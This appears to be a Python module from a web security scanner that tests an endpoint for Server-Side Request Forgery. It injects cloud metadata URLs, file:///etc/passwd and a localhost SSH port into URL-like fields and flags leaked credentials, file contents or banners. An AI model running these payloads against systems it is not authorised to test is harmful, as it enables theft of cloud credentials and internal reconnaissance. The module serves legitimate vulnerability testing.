from typing import Any, Dict
from ..http_client import HttpClient
from ..scenarios import SimpleScenario

def run_ssrf_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Server-Side Request Forgery (SSRF)
    """
    # Common Internal/Cloud Targets
    ssrf_payloads = [
        "http://metadata.google.internal/", # GCP
        "http://169.254.169.254/latest/meta-data/", # AWS
        "file:///etc/passwd",
        "http://127.0.0.1:22",
    ]
    
    fields = scenario.config.get("fields", ["url", "webhook", "callback"])
    issues = []
    leaked_data = []
    
    for field in fields:
        for p in ssrf_payloads:
            body = {"url": "http://example.com"} # Default valid
            body[field] = p
            
            resp = client.send(scenario.method, scenario.target, json_body=body)
            
            suspicious = False
            reasons = []
            
            lower_text = resp.text.lower()
            
            # Evidence: Metadata Leak
            # AWS usually returns list like 'ami-id', 'instance-id'
            aws_keys = ["ami-id", "instance-id", "iam/security-credentials"]
            for k in aws_keys:
                if k in lower_text:
                    suspicious = True
                    reasons.append(f"AWS Metadata Leak ({k})")
                    leaked_data.append(f"AWS Data: {resp.text[:100]}...")
            
            # File Leak
            if "root:x:0:0" in lower_text:
                suspicious = True
                reasons.append("File Leak (/etc/passwd)")
                leaked_data.append(f"Shadow File: {resp.text[:100]}...")
                
            # Internal Port Scan
            if "SSH-" in resp.text:
                suspicious = True
                reasons.append("Internal Service (SSH) Banner")
                leaked_data.append(f"Banner: {resp.text.strip()}")

            if suspicious:
                issues.append(f"[CRITICAL] SSRF in '{field}': {', '.join(reasons)}")

    return {
        "scenario_id": scenario.id,
        "attack_type": "ssrf",
        "passed": len(issues) == 0,
        "details": {"issues": issues, "leaked_data": leaked_data}
    }
